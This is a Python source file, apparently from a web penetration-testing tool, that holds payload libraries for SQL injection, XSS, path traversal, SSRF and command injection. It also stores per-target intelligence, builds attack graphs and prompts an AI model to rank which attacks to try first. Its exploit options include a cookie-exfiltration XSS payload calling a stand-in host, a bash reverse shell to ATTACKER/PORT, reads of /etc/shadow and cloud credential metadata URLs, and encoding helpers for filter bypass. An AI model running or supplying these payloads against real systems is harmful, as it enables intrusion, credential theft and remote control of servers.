            {"payload_template": "{value}''", "expected": "baseline_restore", "desc": "Double quote restore"},
            {"payload_template": "{value}' AND '1'='1", "expected": "same_as_baseline", "desc": "True condition"},
            {"payload_template": "{value}' AND '1'='2", "expected": "different_from_baseline", "desc": "False condition"},
            {"payload_template": "{value}' AND SLEEP(5)--", "expected": "time_delay", "desc": "Time-based confirmation"},
        ],
        "XSS": [
            {"payload_template": "{value}", "expected": "baseline", "desc": "Baseline request"},
            {"payload_template": "<script>alert(1)</script>", "expected": "check_reflection", "desc": "Basic script injection"},
            {"payload_template": "\"><img src=x onerror=alert(1)>", "expected": "check_reflection", "desc": "Attribute breakout"},
            {"payload_template": "{{7*7}}", "expected": "check_49", "desc": "Template injection test"},
        ],
        "LFI": [
            {"payload_template": "{value}", "expected": "baseline", "desc": "Baseline request"},
            {"payload_template": "../../../../etc/passwd", "expected": "check_passwd", "desc": "Unix passwd read"},
            {"payload_template": "..\\..\\..\\..\\windows\\win.ini", "expected": "check_winini", "desc": "Windows ini read"},
            {"payload_template": "....//....//....//etc/passwd", "expected": "check_passwd", "desc": "Filter bypass"},
        ],
        "SSRF": [
            {"payload_template": "{value}", "expected": "baseline", "desc": "Baseline request"},
            {"payload_template": "http://127.0.0.1", "expected": "check_internal", "desc": "Localhost probe"},
            {"payload_template": "http://169.254.169.254/latest/meta-data/", "expected": "check_metadata", "desc": "Cloud metadata"},
        ],
        "RCE": [
            {"payload_template": "{value}", "expected": "baseline", "desc": "Baseline request"},
            {"payload_template": "{value}; sleep 5", "expected": "time_delay", "desc": "Sleep injection"},
            {"payload_template": "{value} | id", "expected": "check_id", "desc": "Command piping"},
            {"payload_template": "{value}$(sleep 5)", "expected": "time_delay", "desc": "Subshell sleep"},
        ],
    }

    @classmethod
    def get_verification_steps(cls, vuln_type: str, target_value: str) -> List[Dict[str, str]]:
        """Get verification sequence for a vulnerability type."""
        # Find best matching sequence
        best_key = None
        for key in cls.VERIFICATION_SEQUENCES:
            if key.lower() in vuln_type.lower() or vuln_type.lower() in key.lower():
                best_key = key
                break

        if not best_key:
            # Generic verification
            return [
                {"payload": target_value, "expected": "baseline", "description": "Baseline request"},
                {"payload": target_value + "'", "expected": "error_or_change", "description": "Quote injection test"},
                {"payload": target_value + "<script>alert(1)</script>", "expected": "check_reflection", "description": "XSS test"},
            ]

        steps = cls.VERIFICATION_SEQUENCES[best_key]
        result = []
        for step in steps:
            payload = step["payload_template"].replace("{value}", target_value)
            result.append({
                "payload": payload,
                "expected": step["expected"],
                "description": step["desc"],
            })

        return result

    @classmethod
    def get_exploit_options(cls, vuln_type: str) -> List[Dict[str, str]]:
        """Get exploit testing options for a confirmed vulnerability."""
        vt_lower = vuln_type.lower()
        options = []

        if "sql" in vt_lower:
            options = [
                {"action": "extract_version", "label": "Extract Database Version", "payload": "' UNION SELECT @@version--"},
                {"action": "enumerate_tables", "label": "Enumerate Tables", "payload": "' UNION SELECT table_name FROM information_schema.tables--"},
                {"action": "extract_users", "label": "Extract User Data", "payload": "' UNION SELECT username,password FROM users--"},
                {"action": "test_blind", "label": "Test Blind SQLi", "payload": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--"},
            ]
        elif "xss" in vt_lower:
            options = [
                {"action": "test_execution", "label": "Test Browser Execution", "payload": "<script>alert(document.domain)</script>"},
                {"action": "encode_payload", "label": "Encode Payload (URL)", "payload": "%3Cscript%3Ealert(1)%3C/script%3E"},
                {"action": "bypass_filter", "label": "Bypass Filters", "payload": "<svg/onload=alert(1)>"},
                {"action": "steal_cookies", "label": "Cookie Exfil PoC", "payload": "<img src=x onerror=fetch('//evil/'+document.cookie)>"},
            ]
        elif "lfi" in vt_lower or "path" in vt_lower:
            options = [
                {"action": "read_sensitive", "label": "Read Sensitive Files", "payload": "../../../../etc/shadow"},
                {"action": "source_disclosure", "label": "PHP Source Disclosure", "payload": "php://filter/convert.base64-encode/resource=index.php"},
                {"action": "log_poison", "label": "Log Poisoning PoC", "payload": "../../../../var/log/apache2/access.log"},
            ]
        elif "ssrf" in vt_lower:
            options = [
                {"action": "port_scan", "label": "Internal Port Scan", "payload": "http://127.0.0.1:PORT"},
                {"action": "cloud_creds", "label": "Cloud Credentials", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
                {"action": "internal_api", "label": "Internal API Access", "payload": "http://localhost:8080/admin"},
            ]
        elif "rce" in vt_lower or "command" in vt_lower:
            options = [
                {"action": "whoami", "label": "Identify User", "payload": "; whoami"},
                {"action": "reverse_shell", "label": "Reverse Shell PoC", "payload": "; bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"},
                {"action": "file_read", "label": "Read System File", "payload": "; cat /etc/passwd"},
            ]
        else:
            options = [
                {"action": "repeat_test", "label": "Repeat Verification", "payload": ""},
                {"action": "modify_payload", "label": "Modify & Retest", "payload": ""},
            ]

        return options


# ═══════════════════════════════════════════════════════════════════════════════
# Attack Memory Store
# ═══════════════════════════════════════════════════════════════════════════════

class AttackMemoryStore:
    """Stores intelligence from previous scans for reuse."""

    _store: Dict[str, Dict[str, Any]] = {}

    @classmethod
    def save(cls, target_host: str, intel: Dict[str, Any]):
        """Save intelligence for a target."""
        key = cls._normalize_host(target_host)
        if key not in cls._store:
            cls._store[key] = {
                "host": target_host,
                "first_seen": time.time(),
                "last_seen": time.time(),
                "database_type": "",
                "framework": "",
                "technologies": [],
                "discovered_endpoints": [],
                "confirmed_vulns": [],
                "patterns": [],
                "payloads_that_worked": [],
            }

        entry = cls._store[key]
        entry["last_seen"] = time.time()

        # Merge intel
        if intel.get("database_type"):
            entry["database_type"] = intel["database_type"]
        if intel.get("framework"):
            entry["framework"] = intel["framework"]
        for t in intel.get("technologies", []):
            if t not in entry["technologies"]:
                entry["technologies"].append(t)
        for ep in intel.get("endpoints", []):
            if ep not in entry["discovered_endpoints"]:
                entry["discovered_endpoints"].append(ep)
        for v in intel.get("confirmed_vulns", []):
            entry["confirmed_vulns"].append(v)
        for p in intel.get("successful_payloads", []):
            if p not in entry["payloads_that_worked"]:
                entry["payloads_that_worked"].append(p)

        # Cap lists
        entry["discovered_endpoints"] = entry["discovered_endpoints"][-100:]
        entry["confirmed_vulns"] = entry["confirmed_vulns"][-50:]
        entry["payloads_that_worked"] = entry["payloads_that_worked"][-50:]

    @classmethod
    def get(cls, target_host: str) -> Optional[Dict[str, Any]]:
        """Retrieve stored intelligence for a target."""
        key = cls._normalize_host(target_host)
        return cls._store.get(key)

    @classmethod
    def get_all(cls) -> Dict[str, Dict[str, Any]]:
        """Get all stored intelligence."""
        return {k: {kk: vv for kk, vv in v.items() if kk != "payloads_that_worked"}
                for k, v in cls._store.items()}

    @classmethod
    def _normalize_host(cls, url_or_host: str) -> str:
        try:
            parsed = urlparse(url_or_host if "://" in url_or_host else f"https://{url_or_host}")
            return (parsed.hostname or url_or_host).lower().strip()
        except Exception:
            return url_or_host.lower().strip()


# ═══════════════════════════════════════════════════════════════════════════════
# Attack Graph Builder
# ═══════════════════════════════════════════════════════════════════════════════

class AttackGraphBuilder:
    """Builds visual attack surface graph from discovered vulnerabilities."""

    @classmethod
    def build(cls, target: str, findings: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Build attack graph from findings."""
        parsed = urlparse(target if "://" in target else f"https://{target}")
        root_host = parsed.hostname or target

        # Group findings by endpoint path
        path_vulns: Dict[str, List[Dict[str, Any]]] = {}
        for f in findings:
            path = f.get("endpoint", f.get("path", f.get("target", "/")))
            if path not in path_vulns:
                path_vulns[path] = []
            path_vulns[path].append(f)

        # Build tree
        nodes = []
        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

        for path, vulns in sorted(path_vulns.items()):
            vuln_entries = []
            max_severity = "info"
            for v in vulns:
                sev = v.get("severity", "info").lower()
                vuln_entries.append({
                    "type": v.get("type", v.get("vuln_type", "Unknown")),
                    "severity": sev,
                    "confidence": v.get("confidence", 0),
                    "parameter": v.get("parameter", ""),
                })
                if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                    max_severity = sev

            nodes.append({
                "path": path,
                "vulns": vuln_entries,
                "severity": max_severity,
                "vuln_count": len(vuln_entries),
            })

        # Sort by severity
        nodes.sort(key=lambda n: -severity_order.get(n["severity"], 0))

        # Build attack chains (simplified)
        chains = []
        vuln_types_found = set()
        for n in nodes:
            for v in n["vulns"]:
                vuln_types_found.add(v["type"].lower())

        # Chain detection rules
        chain_rules = [
            ({"sql injection"}, {"idor"}, "SQLi + IDOR: Extract data via SQL injection, then access other users' resources"),
            ({"xss"}, {"session fixation", "authentication bypass"}, "XSS + Auth: Steal session tokens via XSS to hijack accounts"),
            ({"ssrf"}, {"cloud misconfig", "api misconfiguration"}, "SSRF + Cloud: Access internal services and cloud metadata"),
            ({"lfi", "path traversal"}, {"rce", "command injection"}, "LFI + RCE: Read source code, then execute commands"),
        ]

        for required, optional, description in chain_rules:
            if required.intersection(vuln_types_found):
                matched_optional = optional.intersection(vuln_types_found)
                if matched_optional:
                    chains.append({
                        "description": description,
                        "vulns_involved": list(required.union(matched_optional)),
                        "risk": "critical",
                    })

        return {
            "target": root_host,
            "total_endpoints": len(nodes),
            "total_vulns": sum(n["vuln_count"] for n in nodes),
            "nodes": nodes,
            "chains": chains,
            "severity_summary": {
                "critical": sum(1 for n in nodes for v in n["vulns"] if v["severity"] == "critical"),
                "high": sum(1 for n in nodes for v in n["vulns"] if v["severity"] == "high"),
                "medium": sum(1 for n in nodes for v in n["vulns"] if v["severity"] == "medium"),
                "low": sum(1 for n in nodes for v in n["vulns"] if v["severity"] == "low"),
            },
        }


# ═══════════════════════════════════════════════════════════════════════════════
# AI Analysis Integration
# ═══════════════════════════════════════════════════════════════════════════════

def ai_analyze_request(method: str, url: str, headers: Dict[str, str],
                       cookies: Dict[str, str], body: str,
                       params: Dict[str, str]) -> Dict[str, Any]:
    """AI-powered request analysis combining rule-based + AI analysis."""
    # Rule-based analysis
    vectors = AttackSurfaceAnalyzer.analyze(method, url, headers, cookies, body, params)

    result = {
        "attack_vectors": [asdict(v) for v in vectors],
        "summary": {
            "total_vectors": len(vectors),
            "categories": list(set(v.category for v in vectors)),
            "highest_confidence": max((v.confidence for v in vectors), default=0),
            "attack_points": list(set(v.target for v in vectors)),
        },
        "ai_enhanced": False,
    }

    # Try AI enhancement if available
    if ai_service and ai_service.is_available():
        try:
            categories = result["summary"]["categories"]
            targets = result["summary"]["attack_points"]
            prompt = f"""Analyze this HTTP request for security vulnerabilities:

Method: {method}
URL: {url}
Parameters: {json.dumps(params)}
Headers: {json.dumps({k: v for k, v in headers.items() if k.lower() not in ('cookie', 'authorization')})}
Body snippet: {body[:500] if body else 'none'}

Rule-based analysis already found these attack vectors: {', '.join(categories)}
Targeting: {', '.join(targets)}

Provide a brief strategic recommendation (2-3 sentences) for which attacks to try first and why.
Format as JSON: {{"recommendation": "...", "priority_order": ["type1", "type2"], "additional_vectors": ["any missed vectors"]}}"""

            ai_text = ai_service._generate(prompt, "You are an expert penetration tester.")
            try:
                if "```json" in ai_text:
                    ai_json = json.loads(ai_text.split("```json")[1].split("```")[0].strip())
                elif "```" in ai_text:
                    ai_json = json.loads(ai_text.split("```")[1].split("```")[0].strip())
                else:
                    ai_json = json.loads(ai_text.strip())

                result["ai_recommendation"] = ai_json.get("recommendation", "")
                result["ai_priority_order"] = ai_json.get("priority_order", [])
                result["ai_additional_vectors"] = ai_json.get("additional_vectors", [])
                result["ai_enhanced"] = True
            except (json.JSONDecodeError, ValueError):
                result["ai_recommendation"] = ai_text[:500]
                result["ai_enhanced"] = True
        except Exception as e:
            result["ai_error"] = str(e)[:200]

    return result


# ═══════════════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════════════

_VULN_DISPLAY_NAMES = {
    "sqli": "SQL Injection",
    "xss": "Cross-Site Scripting (XSS)",
    "lfi": "Path Traversal / LFI",
    "ssrf": "Server-Side Request Forgery (SSRF)",
    "idor": "IDOR",
    "auth_bypass": "Authentication Bypass",
    "rce": "Remote Code Execution (RCE)",
    "ssti": "Server-Side Template Injection (SSTI)",
}


def _get_subcategory(vuln_type: str, value: str) -> str:
    if vuln_type == "sqli":
        return "Numeric Injection" if value.isdigit() else "String Injection"
    if vuln_type == "xss":
        return "Reflected XSS"
    if vuln_type == "lfi":
        return "Path Traversal"
    if vuln_type == "ssrf":
        return "URL Fetch"
    if vuln_type == "rce":
        return "Command Injection"
    if vuln_type == "ssti":
        return "Template Injection"
    return vuln_type


def _describe_payload(vuln_type: str, payload: str) -> str:
    """Generate human-readable description for a payload."""
    descs = {
        "sqli": {
            "OR 1=1": "Boolean always-true bypass",
            "UNION SELECT": "UNION-based data extraction",
            "SLEEP": "Time-based blind injection",
            "WAITFOR": "MSSQL time-based blind",
            "DROP": "Destructive query test",
            "ORDER BY": "Column count enumeration",
            "EXTRACTVALUE": "XML-based error extraction",
            "CONVERT": "Type conversion error leak",
        },
        "xss": {
            "script": "Classic script injection",
            "onerror": "Event handler injection",
            "onload": "Load event injection",
            "svg": "SVG-based injection",
            "img": "Image error handler",
            "alert": "Alert box proof-of-concept",
            "fetch": "Data exfiltration PoC",
        },
        "lfi": {
            "etc/passwd": "Unix password file read",
            "win.ini": "Windows config file read",
            "php://": "PHP stream wrapper",
            "data://": "Data stream code execution",
            "proc/self": "Process info disclosure",
        },
    }

    type_descs = descs.get(vuln_type, {})
    payload_upper = payload.upper()
    for keyword, desc in type_descs.items():
        if keyword.upper() in payload_upper:
            return desc

    return f"{_VULN_DISPLAY_NAMES.get(vuln_type, vuln_type)} payload"


def _generate_encoded_variants(payload: str) -> List[Dict[str, str]]:
    """Generate encoded variants of a payload."""
    from urllib.parse import quote
    import base64

    variants = []

    # URL encoding
    url_encoded = quote(payload, safe="")
    if url_encoded != payload:
        variants.append({"encoding": "URL", "value": url_encoded})

    # Double URL encoding
    double_encoded = quote(url_encoded, safe="")
    if double_encoded != url_encoded:
        variants.append({"encoding": "Double URL", "value": double_encoded})

    # Base64
    b64 = base64.b64encode(payload.encode()).decode()
    variants.append({"encoding": "Base64", "value": b64})

    # HTML entities
    html_enc = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    if html_enc != payload:
        variants.append({"encoding": "HTML Entities", "value": html_enc})

    # Unicode
    unicode_enc = "".join(f"\\u{ord(c):04x}" for c in payload[:50])
    variants.append({"encoding": "Unicode", "value": unicode_enc})

    return variants[:5]


def _get_fuzz_recommendation(anomalies: List[Dict]) -> str:
    """Generate recommendation based on detected anomalies."""
    if not anomalies:
        return "No anomalies detected. Try different mutation strategies or parameters."

    types = [a["type"] for a in anomalies]
    severities = [a.get("severity", "info") for a in anomalies]

    if "critical" in severities:
        return "CRITICAL finding detected! Run verification sequence to confirm exploitation."

    if "timing_anomaly" in types:
        return "Timing anomaly suggests time-based blind injection. Run graduated SLEEP tests (1s, 3s, 5s)."

    if "status_change" in types:
        return "Status code changed — indicates input processing. Try targeted payloads for the detected category."

    if "length_anomaly" in types:
        return "Response length changed significantly. Compare responses to identify injected content."

    if "reflection" in types:
        return "Payload reflected in response. Test for XSS with script execution payloads."

    if "pattern_match" in types:
        return "Error pattern detected. Analyze the error message for exploitation clues."

    return "Anomalies detected. Run further targeted tests to confirm vulnerability."
